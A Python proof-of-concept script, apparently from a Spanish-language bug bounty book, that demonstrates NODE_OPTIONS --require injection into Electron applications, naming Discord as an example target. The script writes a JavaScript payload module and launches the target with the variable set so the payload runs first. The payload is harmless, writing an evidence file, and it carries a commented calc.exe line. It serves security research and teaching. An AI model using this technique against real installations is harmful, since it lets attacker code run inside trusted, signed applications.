# Extraído de: LibroBugBounty/cap-07-firma-codigo.md
#!/usr/bin/env python3
"""
PoC de NODE_OPTIONS injection en aplicaciones Electron.
Demuestra ejecuciÃ³n de cÃ³digo via variable de entorno.

Solo funciona si el fuse EnableNodeOptionsEnvironmentVariable
estÃ¡ habilitado (Electron Fuse 3).
"""
import os
import subprocess
from pathlib import Path

def create_payload_module(output_path: str):
    """Crea un mÃ³dulo JavaScript que se cargarÃ¡ via NODE_OPTIONS."""
    payload = """
// MÃ³dulo cargado via NODE_OPTIONS --require
// Se ejecuta antes del main.js de la aplicaciÃ³n
const { execSync } = require('child_process');
const fs = require('fs');

// PoC: escribir evidencia
fs.writeFileSync(
    'C:\\\\temp\\\\node_options_poc.txt',
    `NODE_OPTIONS injection successful\\n` +
    `PID: ${process.pid}\\n` +
    `Executable: ${process.execPath}\\n` +
    `Time: ${new Date().toISOString()}\\n`
);

// PoC alternativo: abrir calc.exe
// execSync('calc.exe');
"""
    Path(output_path).write_text(payload)
    return output_path


def inject_via_node_options(target_exe: str, payload_path: str):
    """Ejecuta la aplicaciÃ³n Electron con NODE_OPTIONS inyectado."""
    env = os.environ.copy()
    env["NODE_OPTIONS"] = f"--require={payload_path}"

    # Iniciar la aplicaciÃ³n con la variable de entorno modificada
    proc = subprocess.Popen(
        [target_exe],
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    return proc.pid

# Ejemplo de uso:
# payload = create_payload_module("C:\\temp\\payload.js")
# pid = inject_via_node_options(
#     r"C:\Users\researcher\AppData\Local\Discord\app-1.0.9045\Discord.exe",
#     payload
# )
# print(f"Discord iniciado con payload inyectado, PID: {pid}")
